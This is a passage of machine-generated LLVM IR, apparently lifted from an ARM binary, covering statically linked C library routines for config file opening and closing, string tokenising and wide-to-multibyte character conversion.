  br label %dec_label_pc_18c30

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18dd8
  %v0_18de4 = load i32, i32* @r7, align 4
  %v1_18de4 = inttoptr i32 %v0_18de4 to i8*
  %v2_18de4 = load i8, i8* %v1_18de4, align 1
  %v3_18de4 = zext i8 %v2_18de4 to i32
  store i32 %v3_18de4, i32* %r3.global-to-local, align 4
  %v9_18de8 = icmp eq i8 %v2_18de4, %v2_18dd8
  store i1 %v9_18de8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18de8, label %dec_label_pc_18c30.backedge, label %dec_label_pc_18eb0.preheader

dec_label_pc_18eb0.preheader:                     ; preds = %dec_label_pc_18de4
  %v1_18dec = load i32, i32* @fp, align 4
  store i32 %v1_18dec, i32* @r6, align 4
  %v2_18eb015 = load i8, i8* %v1_18dd8, align 1
  %v3_18eb016 = zext i8 %v2_18eb015 to i32
  store i32 %v3_18eb016, i32* %r2.global-to-local, align 4
  %v2_18eb417 = icmp eq i8 %v2_18eb015, 0
  store i1 %v2_18eb417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18eb417, label %dec_label_pc_18ecc, label %dec_label_pc_18ebc.preheader

dec_label_pc_18ebc.preheader:                     ; preds = %dec_label_pc_18eb0.preheader
  %v2_18ebc82 = load i8, i8* %v1_18de4, align 1
  %v3_18ebc83 = zext i8 %v2_18ebc82 to i32
  store i32 %v3_18ebc83, i32* %r3.global-to-local, align 4
  %v9_18ec086 = icmp eq i8 %v2_18ebc82, %v2_18eb015
  store i1 %v9_18ec086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18ec086, label %dec_label_pc_18ecc, label %bb74

dec_label_pc_18df8:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_18dfc = load i32, i32* %v2_18dac, align 4
  store i32 %v2_18dfc, i32* %r3.global-to-local, align 4
  store i32 %v1_18c0c, i32* %r2.global-to-local, align 4
  %v9_18e04 = icmp eq i32 %v2_18e0888, %v1_18c0c
  store i1 %v9_18e04, i1* %cpsr_z.global-to-local, align 1
  %v5_18e08 = mul i32 %v2_18e0888, 4
  %v6_18e08 = add i32 %v2_18dfc, %v5_18e08
  %v7_18e08 = inttoptr i32 %v6_18e08 to i32*
  store i32 %v0_18e0887, i32* %v7_18e08, align 4
  br i1 %v9_18e04, label %dec_label_pc_18e10, label %dec_label_pc_18e1c

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18df8
  store i32 %v1_18c18, i32* %r3.global-to-local, align 4
  store i1 %v2_18e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e14, label %dec_label_pc_18e1c, label %dec_label_pc_18e3c

dec_label_pc_18e1c:                               ; preds = %dec_label_pc_18e10, %dec_label_pc_18df8
  %v0_18e1c = load i32, i32* @r7, align 4
  %v1_18e1c = inttoptr i32 %v0_18e1c to i8*
  %v2_18e1c = load i8, i8* %v1_18e1c, align 1
  %v3_18e1c = zext i8 %v2_18e1c to i32
  store i32 %v3_18e1c, i32* %r3.global-to-local, align 4
  %v2_18e20 = icmp eq i8 %v2_18e1c, 0
  store i1 %v2_18e20, i1* %cpsr_z.global-to-local, align 1
  %v0_18e24 = load i32, i32* @r4, align 4
  store i32 %v0_18e24, i32* @r0, align 4
  %v1_18e28 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_18e20, i32 %v1_18e28, i32 %v0_18e1c
  store i32 %storemerge, i32* @r1, align 4
  %v0_18e30 = call i32 @strcspn()
  store i32 %v0_18e30, i32* %r0.global-to-local, align 4
  %v0_18e34 = load i32, i32* @r4, align 4
  %v2_18e34 = add i32 %v0_18e34, %v0_18e30
  store i32 %v2_18e34, i32* @r4, align 4
  br label %dec_label_pc_18e74

dec_label_pc_18e3c:                               ; preds = %dec_label_pc_18e10
  %v0_18e3c = load i32, i32* @r4, align 4
  store i32 %v0_18e3c, i32* %r0.global-to-local, align 4
  %v0_18e40 = load i32, i32* @r7, align 4
  %v1_18e40 = inttoptr i32 %v0_18e40 to i8*
  %v2_18e40 = load i8, i8* %v1_18e40, align 1
  %v3_18e40 = zext i8 %v2_18e40 to i32
  %v5_18e44 = call i32 @__GI_strchrnul(i32 %v0_18e3c, i32 %v3_18e40, i32 %v1_18c0c, i32 %v1_18c18)
  store i32 %v5_18e44, i32* %r0.global-to-local, align 4
  store i32 %v1_18c08, i32* %r2.global-to-local, align 4
  store i1 %v2_18dbc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_18e44, i32* @r4, align 4
  br i1 %v2_18dbc, label %dec_label_pc_18e74, label %dec_label_pc_18e60

dec_label_pc_18e5c:                               ; preds = %dec_label_pc_18e60
  %v1_18e5c = add i32 %v0_18e74.pre, -1
  store i32 %v1_18e5c, i32* @r4, align 4
  br label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e3c, %dec_label_pc_18e5c
  %v0_18e60 = phi i32 [ %v1_18e5c, %dec_label_pc_18e5c ], [ %v5_18e44, %dec_label_pc_18e3c ]
  %v1_18e60 = add i32 %v0_18e60, -1
  %v2_18e60 = inttoptr i32 %v1_18e60 to i8*
  %v3_18e60 = load i8, i8* %v2_18e60, align 1
  %v4_18e60 = zext i8 %v3_18e60 to i32
  %v0_18e64 = load i32, i32* @sl, align 4
  store i32 %v0_18e64, i32* %r0.global-to-local, align 4
  %v2_18e68 = call i32 @__GI_strchr(i32 %v0_18e64, i32 %v4_18e60)
  store i32 %v2_18e68, i32* %r0.global-to-local, align 4
  %v2_18e6c = icmp eq i32 %v2_18e68, 0
  store i1 %v2_18e6c, i1* %cpsr_z.global-to-local, align 1
  %v0_18e74.pre = load i32, i32* @r4, align 4
  br i1 %v2_18e6c, label %dec_label_pc_18e74, label %dec_label_pc_18e5c

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e60, %dec_label_pc_18e3c, %dec_label_pc_18e1c
  %v3_18e80 = phi i32 [ %v5_18e44, %dec_label_pc_18e3c ], [ %v2_18e34, %dec_label_pc_18e1c ], [ %v0_18e74.pre, %dec_label_pc_18e60 ]
  %v1_18e74 = inttoptr i32 %v3_18e80 to i8*
  %v2_18e74 = load i8, i8* %v1_18e74, align 1
  %v3_18e74 = zext i8 %v2_18e74 to i32
  store i32 %v3_18e74, i32* %r2.global-to-local, align 4
  %v0_18e78 = load i32, i32* @r7, align 4
  %v1_18e78 = inttoptr i32 %v0_18e78 to i8*
  %v2_18e78 = load i8, i8* %v1_18e78, align 1
  %v3_18e78 = zext i8 %v2_18e78 to i32
  store i32 %v3_18e78, i32* %r3.global-to-local, align 4
  %v9_18e7c = icmp eq i8 %v2_18e78, %v2_18e74
  store i1 %v9_18e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18e7c, label %bb71, label %dec_label_pc_18e88

bb71:                                             ; preds = %dec_label_pc_18e74
  %v1_18e80 = load i32, i32* @fp, align 4
  %v2_18e80 = trunc i32 %v1_18e80 to i8
  store i8 %v2_18e80, i8* %v1_18e74, align 1
  %v0_18e84.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18e84.pr, label %bb73, label %.dec_label_pc_18e88_crit_edge

.dec_label_pc_18e88_crit_edge:                    ; preds = %bb71
  %v0_18e88.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %.dec_label_pc_18e88_crit_edge, %dec_label_pc_18e74
  %v0_18e88 = phi i32 [ %v0_18e88.pre, %.dec_label_pc_18e88_crit_edge ], [ %v3_18e74, %dec_label_pc_18e74 ]
  %v2_18e88 = icmp eq i32 %v0_18e88, 0
  store i1 %v2_18e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18e88, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_18e88
  %v1_18e8c = load i32, i32* @fp, align 4
  %v2_18e8c = trunc i32 %v1_18e8c to i8
  %v3_18e8c = load i32, i32* @r4, align 4
  %v4_18e8c = inttoptr i32 %v3_18e8c to i8*
  store i8 %v2_18e8c, i8* %v4_18e8c, align 1
  %v5_18e8c = load i32, i32* @r4, align 4
  %v6_18e8c = add i32 %v5_18e8c, 1
  store i32 %v6_18e8c, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_18e88, %bb72
  %v2_18e90 = load i32, i32* %stack_var_-68, align 4
  store i32 %v2_18e90, i32* %r3.global-to-local, align 4
  %v2_18e94 = icmp eq i32 %v2_18e90, 0
  store i1 %v2_18e94, i1* %cpsr_z.global-to-local, align 1
  %v0_18eb0.pre = load i32, i32* @r4, align 4
  br i1 %v2_18e94, label %dec_label_pc_18eac, label %dec_label_pc_18e9c

dec_label_pc_18e9c:                               ; preds = %bb73
  store i32 %v0_18eb0.pre, i32* @r0, align 4
  %v1_18ea4 = inttoptr i32 %v0_18eb0.pre to i8*
  %v2_18ea4 = call i32 @__GI_strspn(i8* %v1_18ea4)
  store i32 %v2_18ea4, i32* %r0.global-to-local, align 4
  %v0_18ea8 = load i32, i32* @r4, align 4
  %v2_18ea8 = add i32 %v0_18ea8, %v2_18ea4
  store i32 %v2_18ea8, i32* @r4, align 4
  br label %dec_label_pc_18eac

dec_label_pc_18eac:                               ; preds = %bb73, %dec_label_pc_18e9c
  %v0_18eb0 = phi i32 [ %v2_18ea8, %dec_label_pc_18e9c ], [ %v0_18eb0.pre, %bb73 ]
  %v0_18eac = load i32, i32* @r6, align 4
  %v1_18eac = add i32 %v0_18eac, 1
  store i32 %v1_18eac, i32* @r6, align 4
  %v1_18eb0 = inttoptr i32 %v0_18eb0 to i8*
  %v2_18eb0 = load i8, i8* %v1_18eb0, align 1
  %v3_18eb0 = zext i8 %v2_18eb0 to i32
  store i32 %v3_18eb0, i32* %r2.global-to-local, align 4
  %v2_18eb4 = icmp eq i8 %v2_18eb0, 0
  store i1 %v2_18eb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18eb4, label %dec_label_pc_18ecc, label %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge

dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge:  ; preds = %dec_label_pc_18eac
  %v0_18ebc.pre = load i32, i32* @r7, align 4
  %v1_18ebc = inttoptr i32 %v0_18ebc.pre to i8*
  %v2_18ebc = load i8, i8* %v1_18ebc, align 1
  %v3_18ebc = zext i8 %v2_18ebc to i32
  store i32 %v3_18ebc, i32* %r3.global-to-local, align 4
  %v9_18ec0 = icmp eq i8 %v2_18ebc, %v2_18eb0
  store i1 %v9_18ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18ec0, label %dec_label_pc_18ecc, label %bb74

bb74:                                             ; preds = %dec_label_pc_18ebc.preheader, %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge
  %v2_18e0888 = phi i32 [ %v1_18eac, %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge ], [ %v1_18dec, %dec_label_pc_18ebc.preheader ]
  %v0_18e0887 = phi i32 [ %v0_18eb0, %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge ], [ %v0_18eb013, %dec_label_pc_18ebc.preheader ]
  %v2_18ec4 = load i32, i32* @sb, align 4
  %v3_18ec4 = sub i32 %v2_18e0888, %v2_18ec4
  %v5_18ec4 = xor i32 %v2_18ec4, %v2_18e0888
  %v6_18ec4 = xor i32 %v3_18ec4, %v2_18e0888
  %v7_18ec4 = and i32 %v6_18ec4, %v5_18ec4
  %v8_18ec4 = icmp slt i32 %v7_18ec4, 0
  %v9_18ec4 = icmp slt i32 %v3_18ec4, 0
  %v10_18ec4 = icmp eq i32 %v2_18e0888, %v2_18ec4
  store i1 %v10_18ec4, i1* %cpsr_z.global-to-local, align 1
  %v2_18ec8 = xor i1 %v9_18ec4, %v8_18ec4
  br i1 %v2_18ec8, label %dec_label_pc_18df8, label %dec_label_pc_18ecc

dec_label_pc_18ecc:                               ; preds = %dec_label_pc_18ebc.preheader, %bb74, %dec_label_pc_18eac, %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge, %dec_label_pc_18eb0.preheader
  %v0_18ed0 = phi i32 [ %v1_18dec, %dec_label_pc_18eb0.preheader ], [ %v1_18dec, %dec_label_pc_18ebc.preheader ], [ %v2_18e0888, %bb74 ], [ %v1_18eac, %dec_label_pc_18eac ], [ %v1_18eac, %dec_label_pc_18eac.dec_label_pc_18ebc_crit_edge ]
  store i32 %v3_18bf0, i32* %r2.global-to-local, align 4
  %v9_18ed0 = icmp eq i32 %v0_18ed0, %v3_18bf0
  store i1 %v9_18ed0, i1* %cpsr_z.global-to-local, align 1
  %v6_18ed4 = icmp slt i32 %v0_18ed0, %v3_18bf0
  br i1 %v6_18ed4, label %dec_label_pc_18ed8, label %dec_label_pc_18ee4

dec_label_pc_18ed8:                               ; preds = %dec_label_pc_18ecc
  %v0_18ed8 = load i32, i32* @r8, align 4
  %v1_18ed8 = and i32 %v0_18ed8, 1048576
  %v2_18ed8 = icmp eq i32 %v1_18ed8, 0
  store i1 %v2_18ed8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ed8, label %dec_label_pc_18c30.backedge, label %dec_label_pc_18ee0

dec_label_pc_18ee0:                               ; preds = %dec_label_pc_18ed8, %dec_label_pc_18d98, %.thread, %entry
  br label %dec_label_pc_18ee4

dec_label_pc_18ee4:                               ; preds = %dec_label_pc_18ecc, %dec_label_pc_18cb4, %dec_label_pc_18ee0
  %v0_18ee4 = phi i32 [ %v0_18cc4, %dec_label_pc_18cb4 ], [ 0, %dec_label_pc_18ee0 ], [ %v0_18ed0, %dec_label_pc_18ecc ]
  store i32 %v0_18ee4, i32* %r0.global-to-local, align 4
  store i32 %v3_18bcc, i32* @r4, align 4
  store i32 %v6_18bcc, i32* @r5, align 4
  store i32 %v9_18bcc, i32* @r6, align 4
  store i32 %v12_18bcc, i32* @r7, align 4
  store i32 %v15_18bcc, i32* @r8, align 4
  store i32 %v18_18bcc, i32* @sb, align 4
  store i32 %v21_18bcc, i32* @sl, align 4
  store i32 %v24_18bcc, i32* @fp, align 4
  ret i32 %v0_18ee4

; uselistorder directives
  uselistorder i32 %v0_18ee4, { 1, 0 }
  uselistorder i32 %v0_18ed0, { 0, 2, 1 }
  uselistorder i32 %v3_18ec4, { 1, 0 }
  uselistorder i32 %v2_18ec4, { 1, 0, 2 }
  uselistorder i32 %v2_18e0888, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_18ec0, { 1, 0 }
  uselistorder i32 %v0_18eb0.pre, { 0, 2, 1 }
  uselistorder i32 %v5_18e44, { 1, 0, 2, 3 }
  uselistorder i1 %v9_18ec086, { 1, 0 }
  uselistorder i1 %v9_18de8, { 1, 0 }
  uselistorder i32 %v3_18dc0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_18d98, { 1, 0 }
  uselistorder i1 %v8_18d90, { 1, 0 }
  uselistorder i32 %v3_18d60, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_18d50, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_18d38, { 1, 0, 2 }
  uselistorder i32 %v1_18d28, { 1, 0, 2 }
  uselistorder i32 %v0_18d14, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18d0c, { 1, 0 }
  uselistorder i32 %v1_18cf8, { 1, 0 }
  uselistorder i32 %v1_18cf4, { 1, 0 }
  uselistorder i32 %v2_18cd0, { 1, 0 }
  uselistorder i32 %v1_18cb4, { 2, 0, 1 }
  uselistorder i32 %v0_18c9c, { 1, 0 }
  uselistorder i32 %v1_18c8c, { 0, 2, 1 }
  uselistorder i1 %v2_18dbc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18c18, { 2, 0, 1, 3 }
  uselistorder i32 %v1_18c0c, { 2, 1, 0 }
  uselistorder i32 %v3_18bf4, { 1, 0 }
  uselistorder i32 %v3_18bf0, { 2, 1, 0 }
  uselistorder i32 %v1_18be8, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 7, 2, 3, 4, 5, 6, 1, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 16, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 5, 7, 8, 10, 9, 13, 14, 12, 11, 16, 15, 18, 17, 20, 19, 21, 24, 22, 23, 28, 25, 26, 27, 31, 29, 30, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 12, 13, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 33, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 ptrtoint (i32* @global_var_ff00.45 to i32), { 1, 0, 2 }
  uselistorder i32 %arg3, { 2, 3, 1, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_18ee4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18ecc, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_18eac, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18e60, { 1, 0 }
  uselistorder label %dec_label_pc_18c30.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_18dd8, { 1, 0 }
  uselistorder label %dec_label_pc_18d98, { 1, 0 }
  uselistorder label %dec_label_pc_18d8c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18d50, { 1, 0 }
  uselistorder label %dec_label_pc_18c84, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_18ef0 = load i32, i32* @r4, align 4
  store i32 %v3_18ef0, i32* %stack_var_-8, align 4
  %v6_18ef0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_18ef4 = icmp eq i32* %arg1, null
  br i1 %v2_18ef4, label %bb, label %bb4

bb:                                               ; preds = %entry
  store i32 %v3_18ef0, i32* @r4, align 4
  ret i32 %tmp

bb4:                                              ; preds = %entry
  %v2_18efc = load i32, i32* %arg1, align 4
  %v1_18f00 = inttoptr i32 %v2_18efc to i8*
  %v2_18f00 = call i32 @__GI_fclose(i8* %v1_18f00)
  %v0_18f04 = load i32, i32* @r4, align 4
  %v1_18f04 = add i32 %v0_18f04, 20
  %v2_18f04 = inttoptr i32 %v1_18f04 to i32*
  %v3_18f04 = load i32, i32* %v2_18f04, align 4
  %v2_18f08 = icmp eq i32 %v3_18f04, 0
  br i1 %v2_18f08, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v1_18f10 = xor i1 %v2_18f08, true
  call void @__pseudo_cond_branch(i1 %v1_18f10, i32 ptrtoint (i32* @global_var_16dac.1607 to i32))
  %v0_18f14 = load i32, i32* @r4, align 4
  store i32 %v0_18f14, i32* @r0, align 4
  %v2_18f18 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18f18, i32* @r4, align 4
  store i32 %v6_18ef0, i32* @lr, align 4
  %v0_18f1c = call i32 @free()
  ret i32 %v0_18f1c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18f20 = load i32, i32* @r4, align 4
  store i32 %v3_18f20, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_25380.1609 to i32), i32* @r1, align 4
  %v2_18f28 = call i32 @__GI_fopen(i32 %arg1, i32 ptrtoint (i32* @global_var_25380.1609 to i32))
  store i32 %v2_18f28, i32* @r4, align 4
  %v2_18f2c = icmp eq i32 %v2_18f28, 0
  store i1 %v2_18f2c, i1* @cpsr_z, align 1
  br i1 %v2_18f2c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v3_18f34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_18f34, i32* @r4, align 4
  ret i32 0

.thread:                                          ; preds = %entry
  %v2_18f40 = call i32 @calloc(i32 1, i32 24)
  %v2_18f44 = icmp eq i32 %v2_18f40, 0
  store i1 %v2_18f44, i1* @cpsr_z, align 1
  br i1 %v2_18f44, label %bb4, label %bb3

bb3:                                              ; preds = %.thread
  %v1_18f48 = load i32, i32* @r4, align 4
  %v3_18f48 = inttoptr i32 %v2_18f40 to i32*
  store i32 %v1_18f48, i32* %v3_18f48, align 4
  br label %bb4

bb4:                                              ; preds = %.thread, %bb3
  %v2_18f4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18f4c, i32* @r4, align 4
  ret i32 %v2_18f40

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_18f58 = icmp eq i32 %arg1, 0
  br i1 %v2_18f58, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_18f60 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_18f88 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_18f74 = phi i32 [ %arg1, %.thread ], [ %v3_18f60, %bb ]
  store i32 %arg3, i32* @r4, align 4
  %v2_18f70 = ptrtoint i32* %stack_var_-12 to i32
  %v2_18f78 = ptrtoint i32* %stack_var_-16 to i32
  store i32 16, i32* @r3, align 4
  store i32 %v2_18f70, i32* %stack_var_-16, align 4
  store i32 %v0_18f88, i32* %stack_var_-12, align 4
  %v5_18f90 = inttoptr i32 %v0_18f74 to i8*
  %v6_18f90 = call i32 @__GI_wcsnrtombs(i8* %v5_18f90, i32 %v2_18f78, i32 1, i32 16, i32 %arg3)
  %v2_18f94 = icmp eq i32 %v6_18f90, 0
  br i1 %v2_18f94, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_18fa0 = phi i32 [ %v6_18f90, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_18fa0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_18fb8 = load i32, i32* @r0, align 4
  %v1_18fb8 = load i32, i32* @r1, align 4
  %v5_18fb8 = inttoptr i32 %v0_18fb8 to i8*
  %v6_18fb8 = call i32 @__GI_wcsnrtombs(i8* %v5_18fb8, i32 %v1_18fb8, i32 -1, i32 %arg1, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_18fb8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18fc4 = load i32, i32* @r4, align 4
  store i32 %v3_18fc4, i32* %stack_var_-12, align 4
  %v10_18fc8 = icmp eq i32 %tmp, %arg2
  store i1 %v10_18fc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_18fc8, label %dec_label_pc_18fe0, label %bb

bb:                                               ; preds = %entry
  %v4_18fcc = icmp eq i8* %arg1, null
  store i1 %v4_18fcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @lr, align 4
  br i1 %v4_18fcc, label %dec_label_pc_18fe0.thread, label %bb39

dec_label_pc_18fe0.thread:                        ; preds = %bb
  %v2_18fd0 = ptrtoint i32* %stack_var_-28 to i32
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb40

bb39:                                             ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

dec_label_pc_18fe0:                               ; preds = %entry
  %v2_18fd01 = ptrtoint i32* %stack_var_-28 to i32
  %v3_18fe0 = icmp eq i8* %arg1, null
  store i1 %v3_18fe0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18fe0, label %bb40, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18fe0
  store i32 %v2_18fd01, i32* @lr, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %.thread14.thread

bb40:                                             ; preds = %dec_label_pc_18fe0, %dec_label_pc_18fe0.thread
  %storemerge20 = phi i32 [ %v2_18fd01, %dec_label_pc_18fe0 ], [ %v2_18fd0, %dec_label_pc_18fe0.thread ]
  store i32 %storemerge20, i32* @lr, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %.thread14.thread

.thread14.thread:                                 ; preds = %bb39, %.thread8, %bb40
  %v2_1903c28 = phi i32 [ %v2_18fd01, %.thread8 ], [ %tmp, %bb39 ], [ %storemerge20, %bb40 ]
  %v0_18ff8 = load i32, i32* @r3, align 4
  %v3_18ff8 = icmp uge i32 %v0_18ff8, %arg3
  %arg3.v0_18ff8 = select i1 %v3_18ff8, i32 %arg3, i32 %v0_18ff8
  store i32 %arg3.v0_18ff8, i32* %r5.global-to-local, align 4
  %v1_19004 = inttoptr i32 %arg2 to i32*
  %v2_19004 = load i32, i32* %v1_19004, align 4
  store i32 %v2_19004, i32* %r2.global-to-local, align 4
  store i32 %arg3.v0_18ff8, i32* %r0.global-to-local, align 4
  %v2_1905022 = icmp eq i32 %arg3.v0_18ff8, 0
  store i1 %v2_1905022, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1905022, label %dec_label_pc_19058, label %dec_label_pc_19010

dec_label_pc_19010:                               ; preds = %.thread14.thread, %dec_label_pc_19048.dec_label_pc_19010_crit_edge
  %v2_1903c = phi i32 [ %v2_19048, %dec_label_pc_19048.dec_label_pc_19010_crit_edge ], [ %v2_1903c28, %.thread14.thread ]
  %v0_1901c = phi i32 [ %v0_19010.pre, %dec_label_pc_19048.dec_label_pc_19010_crit_edge ], [ %v2_19004, %.thread14.thread ]
  %v1_19010 = inttoptr i32 %v0_1901c to i32*
  %v2_19010 = load i32, i32* %v1_19010, align 4
  %v7_19014 = icmp eq i32 %v2_19010, 127
  store i1 %v7_19014, i1* %cpsr_z.global-to-local, align 1
  %v1_19018 = urem i32 %v2_19010, 256
  store i32 %v1_19018, i32* %ip.global-to-local, align 4
  %v1_1901c = add i32 %v0_1901c, 4
  store i32 %v1_1901c, i32* %r2.global-to-local, align 4
  %tmp45 = icmp ult i32 %v2_19010, 128
  br i1 %tmp45, label %dec_label_pc_19038, label %dec_label_pc_19024

dec_label_pc_19024:                               ; preds = %dec_label_pc_19010
  %v0_19024 = call i32 @__GI___errno_location()
  store i32 %v0_19024, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_19030 = inttoptr i32 %v0_19024 to i32*
  store i32 84, i32* %v2_19030, align 4
  %v0_19064.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19064

dec_label_pc_19038:                               ; preds = %dec_label_pc_19010
  %v2_19038 = icmp eq i32 %v1_19018, 0
  store i1 %v2_19038, i1* %cpsr_z.global-to-local, align 1
  %v1_1903c = trunc i32 %v2_19010 to i8
  %v3_1903c = inttoptr i32 %v2_1903c to i8*
  store i8 %v1_1903c, i8* %v3_1903c, align 1
  %v0_19040 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19040, label %.dec_label_pc_19058_crit_edge, label %dec_label_pc_19048

dec_label_pc_19048:                               ; preds = %dec_label_pc_19038
  %v0_19048 = load i32, i32* @lr, align 4
  %v1_19048 = load i32, i32* %r4.global-to-local, align 4
  %v2_19048 = add i32 %v1_19048, %v0_19048
  store i32 %v2_19048, i32* @lr, align 4
  %v0_1904c = load i32, i32* %r0.global-to-local, align 4
  %v1_1904c = add i32 %v0_1904c, -1
  store i32 %v1_1904c, i32* %r0.global-to-local, align 4
  %v2_19050 = icmp eq i32 %v1_1904c, 0
  store i1 %v2_19050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19050, label %dec_label_pc_19058, label %dec_label_pc_19048.dec_label_pc_19010_crit_edge

dec_label_pc_19048.dec_label_pc_19010_crit_edge:  ; preds = %dec_label_pc_19048
  %v0_19010.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19010

.dec_label_pc_19058_crit_edge:                    ; preds = %dec_label_pc_19038
  %v1_19040 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_19040, i32* %r2.global-to-local, align 4
  %v0_19058.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_19058

